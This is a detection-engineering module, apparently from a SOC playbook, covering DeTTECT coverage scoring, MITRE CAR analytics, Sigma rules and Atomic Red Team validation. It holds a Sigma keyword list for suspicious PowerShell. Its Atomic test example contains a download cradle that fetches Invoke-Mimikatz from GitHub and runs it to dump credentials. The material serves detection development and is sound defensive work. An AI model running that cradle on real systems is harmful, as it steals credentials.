# 04 — Detection Engineering

> **MITRE SOC Strategy Addressed:**
> - Strategy 8: Leverage Tools to Support Analyst Workflow

---

## Purpose

Detection engineering is where threat intelligence becomes operational. This module transforms the prioritized technique list from Module 03 into deployable analytics, maps detection coverage against the ATT&CK matrix, and establishes a detection-as-code development lifecycle.

Three complementary tools form the detection engineering stack:

| Tool | Role |
|---|---|
| **DeTTECT** | ATT&CK-based detection coverage mapping and gap analysis |
| **MITRE CAR** | Pre-built, peer-reviewed analytics linked to ATT&CK techniques |
| **Atomic Red Team** | Technique-level test cases for detection validation |

---

## DeTTECT Integration

### What is DeTTECT?

DeTTECT (Detect Tactics, Techniques & Combat Threats) maps your data sources and detection capabilities against ATT&CK to produce visibility and detection coverage scores.

### DeTTECT Workflow in the Pipeline

```
Module 02 (Data)              Module 03 (Intel)
Data Source Inventory    +    Threat Profile
        │                          │
        ▼                          ▼
┌──────────────────────────────────────────────┐
│              DeTTECT Framework               │
│                                              │
│  1. data_sources.yaml                        │
│     - Map collected data sources to ATT&CK   │
│     - Score data quality per source          │
│                                              │
│  2. techniques_detection.yaml                │
│     - Map existing detections to techniques  │
│     - Score detection quality                │
│                                              │
│  3. group_mapping                            │
│     - Import threat group techniques         │
│     - Compare vs. detection coverage         │
│                                              │
│  OUTPUT: ATT&CK Navigator layers             │
│     - Visibility coverage layer              │
│     - Detection coverage layer               │
│     - Threat group overlay                   │
│     - GAP ANALYSIS (red = uncovered)         │
└──────────────────────────────────────────────┘
        │
        ▼
Detection Engineering Backlog
(Prioritized by gap analysis)
```

### DeTTECT YAML Templates

#### data_sources.yaml

```yaml
version: 1.0
file_type: data-source-administration
data_sources:
  - data_source_name: Process Creation
    data_source:
      - applicable_to: ["windows"]
        products:
          - sysmon
          - windows_security_auditing
        available_for_data_analytics: true
        data_quality:
          device_completeness: 5    # % of devices sending this data
          data_field_completeness: 4 # key fields populated
          timeliness: 5              # near real-time
          consistency: 4             # stable format
          retention: 4               # adequate retention period
        comment: "Sysmon EventID 1 deployed to all Windows endpoints"

  - data_source_name: Network Connection
    data_source:
      - applicable_to: ["windows"]
        products:
          - sysmon
        available_for_data_analytics: true
        data_quality:
          device_completeness: 5
          data_field_completeness: 3
          timeliness: 5
          consistency: 4
          retention: 3
        comment: "Sysmon EventID 3 - high volume, consider filtering"

  - data_source_name: DNS Query
    data_source:
      - applicable_to: ["network"]
        products:
          - zeek
        available_for_data_analytics: true
        data_quality:
          device_completeness: 4
          data_field_completeness: 5
          timeliness: 5
          consistency: 5
          retention: 4
        comment: "Zeek DNS logs from network tap"
```

#### techniques_detection.yaml

```yaml
version: 1.0
file_type: technique-administration
techniques:
  - technique_id: T1059.001
    technique_name: "Command and Scripting Interpreter: PowerShell"
    detection:
      - applicable_to: ["windows"]
        location:
          - siem_sigma_rule
          - edr_custom_rule
        comment: "Detects suspicious PowerShell execution patterns"
        score_logbook:
          - date: 2024-01-15
            score: 3        # 0-5 scale
            comment: "Covers encoded commands and download cradles.
                      Missing: constrained language mode bypass,
                      PowerShell without powershell.exe"

  - technique_id: T1053.005
    technique_name: "Scheduled Task/Job: Scheduled Task"
    detection:
      - applicable_to: ["windows"]
        location:
          - siem_sigma_rule
        comment: "Detects scheduled task creation via schtasks and COM"
        score_logbook:
          - date: 2024-01-15
            score: 2
            comment: "Only covers schtasks.exe. Missing: COM-based
                      creation, XML task import, AT command legacy"
```

### DeTTECT Score Definitions

| Score | Meaning | Action |
|---|---|---|
| 0 | No detection | Backlog: build detection |
| 1 | Basic / noisy | Improve: reduce false positives |
| 2 | Fair / partial coverage | Enhance: cover additional sub-techniques |
| 3 | Good / most variants covered | Maintain: monitor for evasions |
| 4 | Very good / low FP rate | Optimize: tune thresholds |
| 5 | Excellent / comprehensive | Mature: automated response integration |

### Running DeTTECT

```bash
# Install
pip install DeTTECT

# Generate visibility coverage layer
python dettect.py ds -fd data_sources.yaml -l

# Generate detection coverage layer
python dettect.py d -ft techniques_detection.yaml -l

# Generate group overlay (threat profile from Module 03)
python dettect.py g -g "APT38,FIN7,APT29" -o threat_overlay -l

# Compare detection vs. threat — produces gap analysis layer
python dettect.py g -g "APT38,FIN7,APT29" \
  -ft techniques_detection.yaml \
  -fd data_sources.yaml \
  -o gap_analysis -l
```

---

## MITRE CAR Integration

### What is MITRE CAR?

The Cyber Analytics Repository (CAR) is a collection of analytics developed by MITRE, each mapped to specific ATT&CK techniques and tested against known datasets.

### CAR Analytics Structure

Each CAR analytic provides:

```
CAR-2024-01-001: Suspicious PowerShell Execution
├── ATT&CK Mapping: T1059.001
├── Data Model: process (fields: exe, command_line, parent_exe)
├── Platforms: Windows
├── Implementation:
│   ├── Pseudocode (platform-agnostic)
│   ├── Sigma rule
│   ├── Splunk SPL
│   └── Elastic KQL
├── Unit Tests: defined inputs → expected outputs
└── Coverage: which sub-technique variants are handled
```

### Using CAR in the Detection Lifecycle

```
1. IDENTIFY          Module 03 threat profile flags T1059.001 as Critical
       │
       ▼
2. SEARCH CAR        Find CAR analytics covering T1059.001
       │             → CAR-2013-04-002: Quick execution of a series of
       │               suspicious commands
       │             → CAR-2014-04-003: Powershell Execution
       ▼
3. EVALUATE          Review analytic against your environment:
       │             - Do you have the required data? (check Module 02)
       │             - Is the pseudocode logic applicable?
       │             - What is the expected false positive rate?
       ▼
4. IMPLEMENT         Translate to your SIEM query language:
       │             - Sigma → SIEM-native via sigma-cli
       │             - Or use the provided SPL/KQL directly
       ▼
5. TEST              Validate with Atomic Red Team (see below)
       │
       ▼
6. DEPLOY            Push to SIEM, tune thresholds, document
       │
       ▼
7. SCORE             Update DeTTECT techniques_detection.yaml
```

### CAR-to-Sigma Workflow

Many CAR analytics ship with Sigma rules. Use Sigma as the detection-as-code format:

```yaml
# Example: Sigma rule derived from CAR for T1059.001
title: Suspicious PowerShell Invocation
id: car-2014-04-003-sigma
status: stable
level: high
description: Detects PowerShell execution with suspicious flags
references:
    - https://car.mitre.org/analytics/CAR-2014-04-003/
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
    suspicious_flags:
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - '-nop'
            - '-NoProfile'
            - 'IEX'
            - 'Invoke-Expression'
            - 'downloadstring'
    condition: selection and suspicious_flags
falsepositives:
    - Legitimate admin scripts using encoded commands
    - Configuration management tools
tags:
    - attack.execution
    - attack.t1059.001
```

---

## Atomic Red Team Integration (Detection Development)

### Role in Detection Engineering

Atomic Red Team provides per-technique test procedures. In this module, Atomic tests are used during detection **development** to verify analytics work. In Module 07, they're used for ongoing **validation**.

### Detection Development with Atomic Tests

```
For each priority technique:

1. Write or import detection analytic (from CAR, custom, or community)
2. Find corresponding Atomic test:
   → atomic-red-team/atomics/T1059.001/T1059.001.yaml
3. Run the Atomic test in a development environment
4. Verify the detection fires:
   - Did the SIEM alert trigger?
   - Did the right fields populate?
   - Is the alert severity correct?
   - What is the false positive rate on baseline traffic?
5. Iterate until the detection reliably catches the test
6. Document results in DeTTECT score logbook
```

### Atomic Test Reference Format

```yaml
# From atomic-red-team/atomics/T1059.001/T1059.001.yaml
attack_technique: T1059.001
display_name: "Command and Scripting Interpreter: PowerShell"
atomic_tests:
  - name: "Mimikatz - Invoke-Mimikatz"
    auto_generated_guid: f66e691e-d90a-4c45-aca0-c85f2f0e9b32
    description: |
      Download Mimikatz and execute Invoke-Mimikatz
    supported_platforms:
      - windows
    executor:
      command: |
        IEX (New-Object Net.WebClient).DownloadString('#{url}')
        Invoke-Mimikatz -DumpCreds
      name: powershell
    input_arguments:
      url:
        description: Mimikatz url
        type: url
        default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
```

---

## Detection-as-Code Lifecycle

### Repository Structure

```
detections/
├── sigma/
│   ├── windows/
│   │   ├── process_creation/
│   │   │   ├── t1059_001_powershell_suspicious.yml
│   │   │   ├── t1053_005_scheduled_task_creation.yml
│   │   │   └── ...
│   │   ├── registry/
│   │   ├── file_event/
│   │   └── network_connection/
│   ├── linux/
│   └── cloud/
├── dettect/
│   ├── data_sources.yaml
│   ├── techniques_detection.yaml
│   └── navigator_layers/
│       ├── visibility_coverage.json
│       ├── detection_coverage.json
│       └── gap_analysis.json
├── tests/
│   └── atomic_validations/
│       ├── T1059.001_test_results.md
│       └── ...
└── README.md
```

### Development Workflow

```
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│  CREATE   │──▶│  TEST    │──▶│  REVIEW  │──▶│  DEPLOY  │──▶│  SCORE   │
│           │   │          │   │          │   │          │   │          │
│ Write     │   │ Run      │   │ Peer     │   │ Push to  │   │ Update   │
│ Sigma     │   │ Atomic   │   │ review   │   │ SIEM via │   │ DeTTECT  │
│ rule      │   │ test     │   │ the rule │   │ CI/CD    │   │ score    │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
```

---

## Inputs

| Input | Source Module | Description |
|---|---|---|
| OSSEM-CDM Mappings | [02 Data Documentation](../02-Data-Documentation/) | Normalised field names for writing portable detection queries |
| OSSEM-DM Relationship Map | [02 Data Documentation](../02-Data-Documentation/) | Entity relationship definitions (Source→Verb→Target) for detection logic |
| Data Quality Scorecards | [02 Data Documentation](../02-Data-Documentation/) | Quality ratings determining which data sources are production-ready for detections |
| Prioritised Technique List | [03 Threat Intelligence](../03-Threat-Intelligence/) | ATT&CK techniques ranked by threat frequency, impact, and feasibility |
| ATT&CK Navigator Layers | [03 Threat Intelligence](../03-Threat-Intelligence/) | Visual threat profile heat maps for coverage gap identification |
| Gap Remediation Tickets | [07 Detection Testing](../07-Detection-Testing/) | Failed detection tests requiring rule fixes or new detections |
| Updated DeTTECT Scores | [07 Detection Testing](../07-Detection-Testing/) | Validated detection scores from Atomic RT testing |
| Detection Gap Findings | [08 Forensics & DFIR](../08-Forensics-DFIR/) | Techniques observed forensically that lacked detections |
| Hunt Findings | M3TID Continuous Hunt | Proactive hunt discoveries requiring detection codification |
| MITRE CAR Analytics | External Framework | Pre-built, peer-reviewed analytics mapped to ATT&CK |

---

## Outputs

| Output | Consumers | Description |
|---|---|---|
| Detection Analytics (Sigma) | SIEM, EDR | Deployable detection rules |
| DeTTECT Coverage Layers | Module 03 (Intel), Module 07 (Testing) | Visual coverage maps |
| Gap Analysis | Module 01 (Governance), Module 03 (Intel) | Uncovered techniques requiring action |
| Detection Backlog | SOC Engineering | Prioritized queue of detections to build |
| Test Validation Results | Module 07 (Testing) | Per-detection Atomic test outcomes |

---

## Implementation Checklist

- [ ] Install DeTTECT and create initial data_sources.yaml from Module 02
- [ ] Create techniques_detection.yaml for existing detections
- [ ] Generate first visibility and detection coverage layers
- [ ] Import threat profile from Module 03 and run gap analysis
- [ ] Review MITRE CAR for analytics covering high-priority gaps
- [ ] Establish Sigma rule repository structure (detection-as-code)
- [ ] Write first wave of detections for Critical-tier techniques
- [ ] Validate each detection using Atomic Red Team tests
- [ ] Set up CI/CD pipeline for detection deployment to SIEM
- [ ] Score all detections in DeTTECT and publish updated Navigator layers
- [ ] Schedule sprint-based detection development cadence

---

## References

- [DeTTECT](https://github.com/rabobank-cdc/DeTTECT)
- [DeTTECT Wiki](https://github.com/rabobank-cdc/DeTTECT/wiki)
- [MITRE CAR](https://car.mitre.org/)
- [Sigma Rules](https://github.com/SigmaHQ/sigma)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [MITRE 11 Strategies — Strategy 8](https://www.mitre.org/sites/default/files/2022-04/11-strategies-of-a-world-class-cybersecurity-operations-center.pdf)
